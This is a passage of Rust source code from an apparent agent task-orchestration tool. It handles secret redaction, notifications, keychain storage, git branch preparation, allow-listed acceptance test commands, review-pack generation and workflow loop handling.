    } else if let Ok(value) = serde_json::from_str::<serde_json::Value>(trimmed) {
        value
    } else {
        json!(raw)
    }
}

#[cfg(test)]
fn redact_patterns(input: &str) -> String {
    shared_redact_text(input, &[])
}

pub(crate) fn redact_text(input: &str, secrets: &[String]) -> String {
    shared_redact_text(input, secrets)
}

pub(crate) fn normalize_redaction_secrets(secrets: &[String]) -> Vec<String> {
    shared_normalize_secrets(secrets)
}

fn project_redaction_secret_registry() -> &'static StdRwLock<HashMap<Uuid, Vec<String>>> {
    static REGISTRY: OnceLock<StdRwLock<HashMap<Uuid, Vec<String>>>> = OnceLock::new();
    REGISTRY.get_or_init(|| StdRwLock::new(HashMap::new()))
}

pub(crate) fn register_project_redaction_secrets(project_id: Uuid, secrets: &[String]) {
    let normalized = normalize_redaction_secrets(secrets);
    match project_redaction_secret_registry().write() {
        Ok(mut registry) => {
            registry.insert(project_id, normalized);
        }
        Err(error) => {
            tracing::warn!(
                project_id = %project_id,
                %error,
                "failed to register project redaction secrets"
            );
        }
    }
}

pub(crate) fn clear_project_redaction_secrets(project_id: Uuid) {
    match project_redaction_secret_registry().write() {
        Ok(mut registry) => {
            registry.remove(&project_id);
        }
        Err(error) => {
            tracing::warn!(
                project_id = %project_id,
                %error,
                "failed to clear project redaction secrets"
            );
        }
    }
}

fn project_redaction_secrets(project_id: Uuid) -> Vec<String> {
    match project_redaction_secret_registry().read() {
        Ok(registry) => registry
            .get(&project_id)
            .cloned()
            .unwrap_or_else(build_secrets_list),
        Err(error) => {
            tracing::warn!(
                project_id = %project_id,
                %error,
                "failed to read project redaction secrets"
            );
            build_secrets_list()
        }
    }
}

pub(crate) async fn current_redaction_secrets(secrets: &Arc<RwLock<Vec<String>>>) -> Vec<String> {
    secrets.read().await.clone()
}

#[derive(Debug, Clone)]
pub(crate) struct StreamRedactor {
    buffer: StreamRedactionBuffer,
    secrets: Arc<RwLock<Vec<String>>>,
}

impl StreamRedactor {
    pub(crate) fn new(secrets: Arc<RwLock<Vec<String>>>) -> Self {
        Self {
            buffer: StreamRedactionBuffer::new(),
            secrets,
        }
    }

    pub(crate) async fn push_chunk(&mut self, chunk: &str) -> Option<String> {
        let secrets = current_redaction_secrets(&self.secrets).await;
        self.buffer.push_chunk(chunk, &secrets)
    }

    pub(crate) async fn finish(&mut self) -> Option<String> {
        let secrets = current_redaction_secrets(&self.secrets).await;
        self.buffer.finish(&secrets)
    }
}

pub(crate) fn redact_json_value(value: serde_json::Value, secrets: &[String]) -> serde_json::Value {
    shared_redact_json_value(value, secrets)
}

pub(crate) fn redact_payload_for_log_with_secrets(
    payload: serde_json::Value,
    secrets: &[String],
) -> serde_json::Value {
    redact_json_value(payload, secrets)
}

pub(crate) fn redact_payload_for_project_log(
    project_id: Uuid,
    payload: serde_json::Value,
) -> serde_json::Value {
    let secrets = project_redaction_secrets(project_id);
    redact_payload_for_log_with_secrets(payload, &secrets)
}

#[derive(Debug, Clone)]
pub(crate) struct OscAttention {
    pub(crate) code: String,
    pub(crate) body: String,
}

pub(crate) fn parse_osc_attention(chunk: &str) -> Vec<OscAttention> {
    let bytes = chunk.as_bytes();
    let mut out = Vec::new();
    let mut i = 0usize;

    while i + 2 < bytes.len() {
        if bytes[i] != 0x1b || bytes[i + 1] != b']' {
            i += 1;
            continue;
        }

        let mut j = i + 2;
        while j < bytes.len() && bytes[j] != b';' {
            if bytes[j] == 0x07
                || (bytes[j] == 0x1b && j + 1 < bytes.len() && bytes[j + 1] == b'\\')
            {
                break;
            }
            j += 1;
        }
        if j >= bytes.len() || bytes[j] != b';' {
            i += 1;
            continue;
        }

        let code = String::from_utf8_lossy(&bytes[i + 2..j]).trim().to_string();
        let body_start = j + 1;
        let mut body_end = None;
        let mut k = body_start;
        while k < bytes.len() {
            if bytes[k] == 0x07 {
                body_end = Some((k, k + 1));
                break;
            }
            if bytes[k] == 0x1b && k + 1 < bytes.len() && bytes[k + 1] == b'\\' {
                body_end = Some((k, k + 2));
                break;
            }
            k += 1;
        }

        let Some((end, next_i)) = body_end else {
            i += 1;
            continue;
        };

        if matches!(code.as_str(), "9" | "99" | "777") {
            let body = String::from_utf8_lossy(&bytes[body_start..end])
                .trim()
                .to_string();
            out.push(OscAttention { code, body });
        }
        i = next_i;
    }

    out
}

pub(crate) fn osc_level(code: &str) -> &'static str {
    match code {
        "777" => "critical",
        "99" => "warning",
        _ => "info",
    }
}

pub(crate) fn osc_title(code: &str) -> &'static str {
    match code {
        "777" => "Agent Attention (Urgent)",
        "99" => "Agent Attention",
        _ => "Agent Notification",
    }
}

#[allow(clippy::too_many_arguments)]
pub(crate) async fn create_notification_row(
    db: &Db,
    emitter: &Arc<dyn EventEmitter>,
    project_id: Uuid,
    task_id: Option<Uuid>,
    session_id: Option<Uuid>,
    title: &str,
    body: &str,
    level: Option<&str>,
    source: &str,
    secrets: &[String],
) -> Result<NotificationView, String> {
    let safe_title = redact_text(title, secrets);
    let safe_body = redact_text(body, secrets);
    let normalized_level = level
        .unwrap_or("info")
        .trim()
        .to_ascii_lowercase()
        .to_string();
    let id = Uuid::new_v4().to_string();
    let created_at = Utc::now();
    let mut task_id_str = task_id.map(|value| value.to_string());
    let mut session_id_str = session_id.map(|value| value.to_string());
    let row_id = id.clone();

    let build_row = |task_id: &Option<String>, session_id: &Option<String>| NotificationRow {
        id: row_id.clone(),
        project_id: project_id.to_string(),
        task_id: task_id.clone(),
        session_id: session_id.clone(),
        title: safe_title.clone(),
        body: safe_body.clone(),
        level: normalized_level.clone(),
        unread: true,
        created_at,
    };

    let mut persist_error = None;
    for attempt in 0..3 {
        match db
            .create_notification(&build_row(&task_id_str, &session_id_str))
            .await
        {
            Ok(()) => {
                persist_error = None;
                break;
            }
            Err(error) => {
                let err_text = error.to_string();
                if attempt < 2
                    && (err_text.contains("database is locked")
                        || err_text.contains("database busy"))
                {
                    tokio::time::sleep(Duration::from_millis((attempt + 1) as u64 * 50)).await;
                    continue;
                }
                persist_error = Some(err_text);
                break;
            }
        }
    }

    if let Some(error) = persist_error.take() {
        let can_drop_links = task_id_str.is_some() || session_id_str.is_some();
        if can_drop_links && (error.contains("FOREIGN KEY") || error.contains("constraint failed"))
        {
            tracing::warn!(
                project_id = %project_id,
                task_id = ?task_id_str,
                session_id = ?session_id_str,
                %error,
                "notification insert failed with linked ids; retrying without linkage"
            );
            task_id_str = None;
            session_id_str = None;
            db.create_notification(&build_row(&task_id_str, &session_id_str))
                .await
                .map_err(|e| e.to_string())?;
        } else {
            return Err(error);
        }
    }

    let out = NotificationView {
        id: id.clone(),
        task_id: task_id_str.clone(),
        session_id: session_id_str.clone(),
        title: safe_title,
        body: safe_body,
        level: normalized_level.clone(),
        unread: true,
        created_at,
    };
    append_event(
        db,
        project_id,
        task_id,
        session_id,
        "notification",
        "NotificationCreated",
        json!({
            "id": id,
            "title": out.title,
            "level": normalized_level,
            "source": source
        }),
    )
    .await;
    emitter.emit("notification_created", json!(out.clone()));
    Ok(out)
}

#[allow(clippy::too_many_arguments)]
pub(crate) async fn notify_task_status_transition(
    db: &Db,
    emitter: &Arc<dyn EventEmitter>,
    project_id: Uuid,
    task_id: Uuid,
    task_title: &str,
    from: &TaskStatus,
    to: &TaskStatus,
    detail: Option<&str>,
) {
    if from == to {
        return;
    }

    let (title, body, level) = match to {
        TaskStatus::Review => (
            "Task ready for review",
            format!("{task_title} is ready for review."),
            "info",
        ),
        TaskStatus::Failed => (
            "Task failed",
            detail
                .filter(|value| !value.trim().is_empty())
                .map(|value| format!("{task_title} failed: {value}"))
                .unwrap_or_else(|| format!("{task_title} failed.")),
            "warning",
        ),
        _ => return,
    };

    let _ = create_notification_row(
        db,
        emitter,
        project_id,
        Some(task_id),
        None,
        title,
        &body,
        Some(level),
        "task_status",
        &[],
    )
    .await;
}

pub(crate) async fn notify_merge_queue_blocked(
    db: &Db,
    emitter: &Arc<dyn EventEmitter>,
    project_id: Uuid,
    task_id: Uuid,
    task_title: &str,
    reason: &str,
) {
    let _ = create_notification_row(
        db,
        emitter,
        project_id,
        Some(task_id),
        None,
        "Merge blocked",
        &format!("{task_title} could not be merged: {reason}"),
        Some("warning"),
        "merge_queue",
        &[],
    )
    .await;
}

pub(crate) async fn notify_merge_completed(
    db: &Db,
    emitter: &Arc<dyn EventEmitter>,
    project_id: Uuid,
    task_id: Uuid,
    task_title: &str,
    target_branch: &str,
) {
    let _ = create_notification_row(
        db,
        emitter,
        project_id,
        Some(task_id),
        None,
        "Merge completed",
        &format!("{task_title} merged into {target_branch}."),
        Some("info"),
        "merge_queue",
        &[],
    )
    .await;
}

pub(crate) async fn store_keychain_secret(
    service: &str,
    account: &str,
    value: &str,
) -> Result<(), String> {
    // Use the security-framework crate to avoid passing the password as a CLI arg
    // (which would expose it in `ps` output).
    #[cfg(target_os = "macos")]
    {
        use security_framework::passwords::set_generic_password;
        set_generic_password(service, account, value.as_bytes()).map_err(|e| e.to_string())
    }
    #[cfg(not(target_os = "macos"))]
    {
        let _ = (service, account, value);
        Err("keychain not supported on this platform".to_string())
    }
}

pub(crate) async fn read_keychain_secret(service: &str, account: &str) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    {
        use security_framework::passwords::get_generic_password;

        let bytes = get_generic_password(service, account).map_err(|e| e.to_string())?;
        String::from_utf8(bytes).map_err(|e| e.to_string())
    }
    #[cfg(not(target_os = "macos"))]
    {
        let _ = (service, account);
        Err("keychain not supported on this platform".to_string())
    }
}

pub(crate) async fn resolve_secret_env(
    db: &Db,
    project_id: Uuid,
) -> Result<(Vec<(String, String)>, Vec<String>), String> {
    self::secrets::resolve_project_secret_env(db, project_id).await
}

pub(crate) async fn git_output(dir: &Path, args: &[&str]) -> Result<String, String> {
    let out = TokioCommand::new("git")
        .args(args)
        .current_dir(dir)
        .output()
        .await
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

async fn git_output_with_config(
    dir: &Path,
    config: &[(&str, &str)],
    args: &[&str],
) -> Result<String, String> {
    let mut cmd = TokioCommand::new("git");
    for (key, value) in config {
        cmd.arg("-c").arg(format!("{key}={value}"));
    }
    let out = cmd
        .args(args)
        .current_dir(dir)
        .output()
        .await
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

async fn git_path_is_tracked(dir: &Path, rel_path: &str) -> Result<bool, String> {
    let out = TokioCommand::new("git")
        .args(["ls-files", "--error-unmatch", "--", rel_path])
        .current_dir(dir)
        .output()
        .await
        .map_err(|e| e.to_string())?;
    if out.status.success() {
        return Ok(true);
    }
    let stderr = String::from_utf8_lossy(&out.stderr);
    if stderr.contains("did not match any file") {
        return Ok(false);
    }
    Ok(false)
}

async fn restore_or_remove_git_path(dir: &Path, rel_path: &str) -> Result<(), String> {
    if git_path_is_tracked(dir, rel_path).await? {
        let _ = git_output(
            dir,
            &[
                "restore",
                "--staged",
                "--worktree",
                "--source=HEAD",
                "--",
                rel_path,
            ],
        )
        .await?;
        return Ok(());
    }

    let abs_path = dir.join(rel_path);
    match tokio::fs::metadata(&abs_path).await {
        Ok(metadata) if metadata.is_dir() => {
            tokio::fs::remove_dir_all(&abs_path)
                .await
                .map_err(|e| e.to_string())?;
        }
        Ok(_) => {
            tokio::fs::remove_file(&abs_path)
                .await
                .map_err(|e| e.to_string())?;
        }
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => {}
        Err(err) => return Err(err.to_string()),
    }
    Ok(())
}

async fn git_clean_paths(dir: &Path, rel_paths: &[&str]) -> Result<(), String> {
    if rel_paths.is_empty() {
        return Ok(());
    }
    let mut args = vec!["clean", "-fd", "--"];
    args.extend(rel_paths.iter().copied());
    let _ = git_output(dir, &args).await?;
    Ok(())
}

pub(crate) async fn branch_ahead_count(dir: &Path, target_branch: &str) -> Result<u64, String> {
    let raw = git_output(
        dir,
        &["rev-list", "--count", &format!("{target_branch}..HEAD")],
    )
    .await?;
    raw.trim()
        .parse::<u64>()
        .map_err(|e| format!("parse branch ahead count: {e}"))
}

pub(crate) async fn git_ref_exists(dir: &Path, ref_name: &str) -> Result<bool, String> {
    let out = TokioCommand::new("git")
        .args(["show-ref", "--verify", "--quiet", ref_name])
        .current_dir(dir)
        .output()
        .await
        .map_err(|e| e.to_string())?;
    Ok(out.status.success())
}

#[derive(Debug, Clone)]
pub(crate) struct TaskCommitResult {
    pub commit_sha: String,
    pub commit_message: String,
}

pub(crate) async fn prepare_task_branch_for_review(
    worktree_path: &Path,
    task_id: Uuid,
    task_title: &str,
    target_branch: &str,
) -> Result<TaskCommitResult, String> {
    for rel_path in [
        "CLAUDE.md",
        ".pnevma/claude-context-state.json",
        ".pnevma/task-context.md",
        ".pnevma/task-context.manifest.json",
        ".pnevma/data",
        ".pnevma/run",
    ] {
        restore_or_remove_git_path(worktree_path, rel_path).await?;
    }
    git_clean_paths(worktree_path, &["CLAUDE.md", ".pnevma"]).await?;

    let pending = git_output(worktree_path, &["status", "--porcelain"]).await?;
    let sanitized_title = task_title
        .lines()
        .next()
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .unwrap_or("task");
    let short_task_id = task_id.to_string();
    let commit_message = format!("task({}): {sanitized_title}", &short_task_id[..8]);

    if !pending.trim().is_empty() {
        let _ = git_output(worktree_path, &["add", "-A", "--", "."]).await?;
        let staged = git_output(worktree_path, &["status", "--porcelain"]).await?;
        if !staged.trim().is_empty() {
            git_output_with_config(
                worktree_path,
                &[("user.name", "Pnevma"), ("user.email", "pnevma@localhost")],
                &["commit", "--no-gpg-sign", "-m", &commit_message],
            )
            .await?;
        }
    }

    let remaining = git_output(worktree_path, &["status", "--porcelain"]).await?;
    if !remaining.trim().is_empty() {
        return Err("agent left uncommitted changes after sanitize/commit".to_string());
    }

    let ahead_count = branch_ahead_count(worktree_path, target_branch).await?;
    if ahead_count == 0 {
        return Err("agent produced no mergeable repository changes".to_string());
    }

    let commit_sha = git_output(worktree_path, &["rev-parse", "HEAD"])
        .await?
        .trim()
        .to_string();
    Ok(TaskCommitResult {
        commit_sha,
        commit_message,
    })
}

#[derive(Debug, Clone)]
struct CheckExecution {
    description: String,
    check_type: String,
    command: Option<String>,
    passed: bool,
    output: Option<String>,
}

fn split_test_command(command: &str) -> Result<(String, Vec<String>), String> {
    const MAX_TEST_COMMAND_ARGS: usize = 32;
    const MAX_TEST_COMMAND_ARG_BYTES: usize = 512;

    let parts = command
        .split_whitespace()
        .map(ToString::to_string)
        .collect::<Vec<_>>();
    let Some(program) = parts.first().cloned() else {
        return Err("TestCommand rejected: command must not be empty".to_string());
    };
    if parts.len() > MAX_TEST_COMMAND_ARGS {
        return Err(format!(
            "TestCommand rejected: command exceeds {MAX_TEST_COMMAND_ARGS} argv segments"
        ));
    }
    if parts
        .iter()
        .any(|part| part.is_empty() || part.len() > MAX_TEST_COMMAND_ARG_BYTES)
    {
        return Err(format!(
            "TestCommand rejected: each argv segment must be between 1 and {MAX_TEST_COMMAND_ARG_BYTES} bytes"
        ));
    }

    Ok((program, parts.into_iter().skip(1).collect()))
}

pub(crate) async fn run_acceptance_checks_for_task(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    task: &TaskContract,
) -> Result<(CheckRunRow, Vec<CheckResultRow>, bool), String> {
    let run_id = Uuid::new_v4().to_string();
    let mut rows = Vec::with_capacity(task.acceptance_criteria.len());
    let mut all_automated_passed = true;
    let mut any_automated = false;
    let worktree = if task.worktree.is_some() {
        db.find_worktree_by_task(&task.id.to_string())
            .await
            .map_err(|e| e.to_string())?
    } else {
        None
    };
    let worktree_path = worktree
        .as_ref()
        .map(|row| PathBuf::from(&row.path))
        .unwrap_or_else(|| project_path.to_path_buf());

    for check in &task.acceptance_criteria {
        let execution = match check.check_type {
            CheckType::ManualApproval => CheckExecution {
                description: check.description.clone(),
                check_type: "ManualApproval".to_string(),
                command: check.command.clone(),
                passed: true,
                output: Some("manual approval required".to_string()),
            },
            CheckType::FileExists => {
                any_automated = true;
                let candidate = if let Some(command) = &check.command {
                    if Path::new(command).is_absolute() {
                        PathBuf::from(command)
                    } else {
                        worktree_path.join(command)
                    }
                } else if Path::new(&check.description).is_absolute() {
                    PathBuf::from(&check.description)
                } else {
                    worktree_path.join(&check.description)
                };
                let passed = candidate.exists();
                if !passed {
                    all_automated_passed = false;
                }
                CheckExecution {
                    description: check.description.clone(),
                    check_type: "FileExists".to_string(),
                    command: check.command.clone(),
                    passed,
                    output: Some(format!("path checked: {}", candidate.to_string_lossy())),
                }
            }
            CheckType::TestCommand => {
                any_automated = true;
                let command = check
                    .command
                    .clone()
                    .filter(|v| !v.trim().is_empty())
                    .unwrap_or_else(|| check.description.clone());

                // Validate command against known-safe test runner prefixes.
                // Reject commands with shell metacharacters that could enable injection.
                const ALLOWED_PREFIXES: &[&str] = &[
                    "cargo test",
                    "cargo nextest",
                    "npm test",
                    "npm run test",
                    "npx",
                    "yarn test",
                    "yarn run test",
                    "pytest",
                    "python -m pytest",
                    "just test",
                    "just check",
                    "swift test",
                    "xcodebuild test",
                    "go test",
                    "make test",
                    "bun test",
                    "deno test",
                    "vitest",
                    "jest",
                ];
                let cmd_trimmed = command.trim();
                let has_invalid_chars = cmd_trimmed
                    .chars()
                    .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
                let has_allowed_prefix = ALLOWED_PREFIXES
                    .iter()
                    .any(|prefix| cmd_trimmed.starts_with(prefix));
                if has_invalid_chars || !has_allowed_prefix {
                    return Err(format!(
                        "TestCommand rejected: command must start with a known test runner \
                         and contain only safe characters [a-zA-Z0-9 _./:=,+@-]. Got: {cmd_trimmed:?}"
                    ));
                }

                let (program, args) = split_test_command(&command)?;
                let out = TokioCommand::new(&program)
                    .args(&args)
                    .current_dir(&worktree_path)
                    .output()
                    .await
                    .map_err(|e| e.to_string())?;
                let passed = out.status.success();
                if !passed {
                    all_automated_passed = false;
                }
                let stdout = String::from_utf8_lossy(&out.stdout);
                let stderr = String::from_utf8_lossy(&out.stderr);
                let mut text = String::new();
                if !stdout.trim().is_empty() {
                    text.push_str(stdout.trim());
                }
                if !stderr.trim().is_empty() {
                    if !text.is_empty() {
                        text.push('\n');
                    }
                    text.push_str(stderr.trim());
                }
                CheckExecution {
                    description: check.description.clone(),
                    check_type: "TestCommand".to_string(),
                    command: Some(command),
                    passed,
                    output: if text.is_empty() { None } else { Some(text) },
                }
            }
        };

        let result_row = CheckResultRow {
            id: Uuid::new_v4().to_string(),
            check_run_id: run_id.clone(),
            project_id: project_id.to_string(),
            task_id: task.id.to_string(),
            description: execution.description,
            check_type: execution.check_type,
            command: execution.command,
            passed: execution.passed,
            output: execution.output,
            created_at: Utc::now(),
        };
        rows.push(result_row);
    }

    if !any_automated {
        all_automated_passed = true;
    }

    let summary = if rows.is_empty() {
        "no checks configured".to_string()
    } else {
        let passed = rows.iter().filter(|r| r.passed).count();
        format!("{passed}/{} checks passed", rows.len())
    };
    let run_row = CheckRunRow {
        id: run_id.clone(),
        project_id: project_id.to_string(),
        task_id: task.id.to_string(),
        status: if all_automated_passed {
            "passed".to_string()
        } else {
            "failed".to_string()
        },
        summary: Some(summary),
        created_at: Utc::now(),
    };
    db.create_check_run(&run_row)
        .await
        .map_err(|e| e.to_string())?;
    for row in &rows {
        db.create_check_result(row)
            .await
            .map_err(|e| e.to_string())?;
    }
    append_event(
        db,
        project_id,
        Some(task.id),
        None,
        "core",
        "AcceptanceCheckRun",
        json!({
            "task_id": task.id,
            "check_run_id": run_id,
            "status": run_row.status,
            "summary": run_row.summary
        }),
    )
    .await;

    Ok((run_row, rows, all_automated_passed))
}

#[allow(clippy::too_many_arguments)]
pub(crate) async fn generate_review_pack(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    target_branch: &str,
    task: &TaskContract,
    check_run: &CheckRunRow,
    check_results: &[CheckResultRow],
    cost_usd: f64,
    summary: Option<&str>,
    secrets: &[String],
) -> Result<ReviewRow, String> {
    let branch = task
        .branch
        .clone()
        .ok_or_else(|| "task branch missing".to_string())?;
    let worktree = db
        .find_worktree_by_task(&task.id.to_string())
        .await
        .map_err(|e| e.to_string())?
        .ok_or_else(|| "task worktree missing".to_string())?;

    let branch_range = format!("{target_branch}...{branch}");
    let diff = redact_text(
        &git_output(project_path, &["diff", &branch_range, "--", "."]).await?,
        secrets,
    );
    let changed_files_raw = git_output(
        project_path,
        &["diff", "--name-only", &branch_range, "--", "."],
    )
    .await?;
    let changed_files = changed_files_raw
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .map(ToString::to_string)
        .collect::<Vec<_>>();

    let stats = git_output(
        project_path,
        &[
            "diff",
            "--shortstat",
            &format!("{target_branch}...{branch}"),
        ],
    )
    .await
    .unwrap_or_default();

    let risk_notes = {
        let mut notes = Vec::new();
        if changed_files.len() > 25 {
            notes.push("large file count changed".to_string());
        }
        if changed_files
            .iter()
            .any(|f| f.ends_with("Cargo.toml") || f.ends_with("package.json"))
        {
            notes.push("dependency manifest changed".to_string());
        }
        if changed_files.iter().any(|f| {
            f.ends_with(".toml")
                || f.ends_with(".yml")
                || f.ends_with(".yaml")
                || f.ends_with(".json")
        }) {
            notes.push("configuration files modified".to_string());
        }
        notes
    };

    let review_dir = project_path
        .join(".pnevma")
        .join("data")
        .join("reviews")
        .join(task.id.to_string());
    tokio::fs::create_dir_all(&review_dir)
        .await
        .map_err(|e| e.to_string())?;
    let diff_path = review_dir.join("diff.patch");
    tokio::fs::write(&diff_path, diff.as_bytes())
        .await
        .map_err(|e| e.to_string())?;
    let context_path = PathBuf::from(&worktree.path)
        .join(".pnevma")
        .join("task-context.md");
    let context_exists = context_path.exists();

    let check_results_json = check_results
        .iter()
        .map(|row| {
            json!({
                "description": redact_text(&row.description, secrets),
                "check_type": row.check_type,
                "command": row.command.as_deref().map(|value| redact_text(value, secrets)),
                "passed": row.passed,
                "output": row.output.as_deref().map(|value| redact_text(value, secrets))
            })
        })
        .collect::<Vec<_>>();
    let pack = json!({
        "task_id": task.id,
        "task_title": task.title,
        "target_branch": target_branch,
        "branch": branch,
        "worktree_path": redact_text(&worktree.path, secrets),
        "changed_files": changed_files,
        "diff_summary": stats.trim(),
        "diff_path": diff_path.to_string_lossy().to_string(),
        "check_run": {
            "id": check_run.id,
            "status": check_run.status,
            "summary": check_run.summary
        },
        "check_results": check_results_json,
        "risk_notes": risk_notes,
        "agent_rationale": summary.map(|value| redact_text(value, secrets)),
        "context_manifest": {
            "path": context_path.to_string_lossy().to_string(),
            "exists": context_exists
        },
        "cost_usd": cost_usd
    });
    let pack_path = review_dir.join("review-pack.json");
    let safe_pack = redact_json_value(pack, secrets);
    tokio::fs::write(
        &pack_path,
        serde_json::to_string_pretty(&safe_pack).map_err(|e| e.to_string())?,
    )
    .await
    .map_err(|e| e.to_string())?;

    let review_row = ReviewRow {
        id: Uuid::new_v4().to_string(),
        task_id: task.id.to_string(),
        status: "Ready".to_string(),
        review_pack_path: pack_path.to_string_lossy().to_string(),
        reviewer_notes: None,
        approved_at: None,
    };
    db.upsert_review(&review_row)
        .await
        .map_err(|e| e.to_string())?;
    append_event(
        db,
        project_id,
        Some(task.id),
        None,
        "review",
        "ReviewPackGenerated",
        json!({
            "task_id": task.id,
            "review_pack_path": review_row.review_pack_path
        }),
    )
    .await;
    Ok(review_row)
}

pub(crate) fn is_terminal_task_status(status: &TaskStatus) -> bool {
    matches!(
        status,
        TaskStatus::Done | TaskStatus::Failed | TaskStatus::Looped
    )
}

/// Check if all tasks in a workflow instance are terminal and update the instance status.
async fn update_workflow_instance_status_and_notify(
    db: &pnevma_db::Db,
    workflow_id: &str,
    workflow_name: &str,
    project_id: Uuid,
    old_status: &str,
    new_status: &str,
    emitter: Option<&Arc<dyn EventEmitter>>,
) {
    if old_status == new_status {
        return;
    }

    let _ = db
        .update_workflow_instance_status(workflow_id, new_status)
        .await;
    append_event(
        db,
        project_id,
        None,
        None,
        "workflow",
        "WorkflowStatusChanged",
        json!({
            "workflow_id": workflow_id,
            "workflow_name": workflow_name,
            "from": old_status,
            "to": new_status
        }),
    )
    .await;

    if let Some(emitter) = emitter {
        emitter.emit(
            "workflow_updated",
            json!({
                "workflow_id": workflow_id,
                "workflow_name": workflow_name,
                "status": new_status
            }),
        );
        let (title, level) = match new_status {
            "Completed" => ("Workflow completed", "info"),
            "Failed" => ("Workflow failed", "warning"),
            _ => return,
        };
        let _ = create_notification_row(
            db,
            emitter,
            project_id,
            None,
            None,
            title,
            &format!("{workflow_name} is now {new_status}."),
            Some(level),
            "workflow",
            &[],
        )
        .await;
    }
}

pub(crate) async fn check_workflow_completion(
    db: &pnevma_db::Db,
    task_id: &str,
    emitter: Option<&Arc<dyn EventEmitter>>,
) {
    let wt = match db.find_workflow_by_task(task_id).await {
        Ok(Some(wt)) => wt,
        _ => return,
    };
    let instance = match db.get_workflow_instance(&wt.workflow_id).await {
        Ok(Some(instance)) => instance,
        _ => return,
    };

    let tasks = match db.list_workflow_tasks(&wt.workflow_id).await {
        Ok(t) => t,
        Err(_) => return,
    };

    let mut all_terminal = true;
    let mut any_failed = false;
    let mut any_active = false;
    let mut only_failed_or_blocked = true;

    for wt_row in &tasks {
        match db.get_task(&wt_row.task_id).await {
            Ok(Some(task_row)) => match task_row.status.as_str() {
                "Done" => {}
                "Failed" => {
                    any_failed = true;
                }
                "Looped" => {} // terminal but not a failure — loop iteration was triggered
                "Blocked" => {
                    all_terminal = false;
                }
                "Ready" | "InProgress" | "Review" => {
                    all_terminal = false;
                    any_active = true;
                    only_failed_or_blocked = false;
                }
                _ => {
                    all_terminal = false;
                    only_failed_or_blocked = false;
                }
            },
            _ => {
                all_terminal = false;
                only_failed_or_blocked = false;
            }
        }
    }

    if all_terminal {
        let new_status = if any_failed { "Failed" } else { "Completed" };
        update_workflow_instance_status_and_notify(
            db,
            &wt.workflow_id,
            &instance.workflow_name,
            Uuid::parse_str(&instance.project_id).unwrap_or_default(),
            &instance.status,
            new_status,
            emitter,
        )
        .await;
    } else if any_failed && !any_active && only_failed_or_blocked {
        update_workflow_instance_status_and_notify(
            db,
            &wt.workflow_id,
            &instance.workflow_name,
            Uuid::parse_str(&instance.project_id).unwrap_or_default(),
            &instance.status,
            "Failed",
            emitter,
        )
        .await;
    }
}

/// Resolve a workflow definition by name, searching project DB → disk YAML → global DB.
async fn resolve_workflow_def(
    workflow_name: &str,
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    global_db: Option<&pnevma_db::GlobalDb>,
) -> Result<WorkflowDef, String> {
    // Check project DB first
    if let Some(row) = db
        .get_workflow_by_name(&project_id.to_string(), workflow_name)
        .await
        .map_err(|e| e.to_string())?
    {
        return WorkflowDef::from_yaml(&row.definition_yaml).map_err(|e| e.to_string());
    }

    // Check YAML files on disk
    let workflows_dir = project_path.join(".pnevma").join("workflows");
    let defs = WorkflowDef::load_all(&workflows_dir).map_err(|e| e.to_string())?;
    if let Some(d) = defs.into_iter().find(|d| d.name == workflow_name) {
        return Ok(d);
    }

    // Check global DB
    if let Some(global_db) = global_db {
        if let Some(global_row) = global_db
            .get_global_workflow_by_name(workflow_name)
            .await
            .map_err(|e| e.to_string())?
        {
            return WorkflowDef::from_yaml(&global_row.definition_yaml).map_err(|e| e.to_string());
        }
    }

    Err(format!("workflow '{workflow_name}' not found"))
}

/// Check if a terminal task should trigger a loop iteration.
/// Returns true if a loop was triggered (caller should skip workflow completion check).
///
/// For `on_failure` mode: triggers only on `Failed`.
/// For `until_complete` mode: triggers on `Failed` and `Done` (unless agent signaled `<COMPLETE>`).
///
/// This function is safe to call from spawned closures because it derives all context
/// from the DB and project_path, without requiring AppState.
pub(crate) async fn check_loop_trigger(
    db: &Db,
    task_id: &str,
    task_status: &TaskStatus,
    project_path: &Path,
    global_db: Option<&pnevma_db::GlobalDb>,
) -> Result<bool, String> {
    // Early exit: only Failed and Done can trigger loops
    if !matches!(task_status, TaskStatus::Failed | TaskStatus::Done) {
        return Ok(false);
    }

    // Find which workflow/step this task belongs to
    let wt = match db
        .find_workflow_by_task(task_id)
        .await
        .map_err(|e| e.to_string())?
    {
        Some(wt) => wt,
        None => return Ok(false),
    };

    // Load workflow instance to get project info and workflow name
    let instance = db
        .get_workflow_instance(&wt.workflow_id)
        .await
        .map_err(|e| e.to_string())?
        .ok_or_else(|| format!("workflow instance '{}' not found", wt.workflow_id))?;

    let project_id = Uuid::parse_str(&instance.project_id).map_err(|e| e.to_string())?;

    // Load the workflow definition to get LoopConfig
    let def = resolve_workflow_def(
        &instance.workflow_name,
        db,
        project_id,
        project_path,
        global_db,
    )
    .await?;

    let step_idx = wt.step_index as usize;
    if step_idx >= def.steps.len() {
        return Ok(false);
    }

    let step = &def.steps[step_idx];
    let loop_config = match &step.loop_config {
        Some(lc) => lc,
        None => return Ok(false),
    };

    // Load the gate task row once (needed for COMPLETE check and Looped marking)
    let mut gate_row = db
        .get_task(task_id)
        .await
        .map_err(|e| e.to_string())?
        .ok_or_else(|| format!("task '{task_id}' not found"))?;

    // Reject onFailure self-loops (target must be < gate step)
    if loop_config.mode == pnevma_core::LoopMode::OnFailure && loop_config.target == step_idx {
        tracing::warn!(
            step_index = step_idx,
            "onFailure loop has self-loop target — skipping (target must be < step index)"
        );
        return Ok(false);
    }

    // Mode-aware status check
    match loop_config.mode {
        pnevma_core::LoopMode::OnFailure => {
            if *task_status != TaskStatus::Failed {
                return Ok(false);
            }
        }
